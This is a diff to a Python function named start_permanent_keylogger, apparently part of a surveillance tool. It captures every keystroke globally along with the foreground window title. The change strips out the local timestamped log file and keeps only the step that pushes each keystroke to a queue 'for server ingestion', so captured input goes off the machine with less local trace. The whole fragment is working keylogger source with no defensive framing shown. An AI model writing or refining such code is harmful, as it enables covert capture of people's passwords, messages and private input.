@@ -386,11 +386,8 @@ def start_permanent_keylogger():
     if "permanent" in ACTIVE_LISTENERS:
         return
 
-    log_path = KEYLOGS_DIR / "global_activity.txt"
-
     def on_press(key):
         try:
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             win_title = get_foreground_window_title()
             key_text = ""
 
@@ -400,11 +397,7 @@ def start_permanent_keylogger():
                 key_str = str(key).replace('Key.', '').upper()
                 key_text = f"[{key_str}]"
 
-            # 1. Write to local continuous log
-            with open(log_path, 'a', encoding='utf-8') as f:
-                f.write(f"[{timestamp}] {key_text}\n")
-
-            # 2. Push to live stream queue for server ingestion
+            # Push to live stream queue for server ingestion
             LIVE_STREAM_QUEUE.put({
                 "stream_type": "keylog",
                 "window_title": win_title,
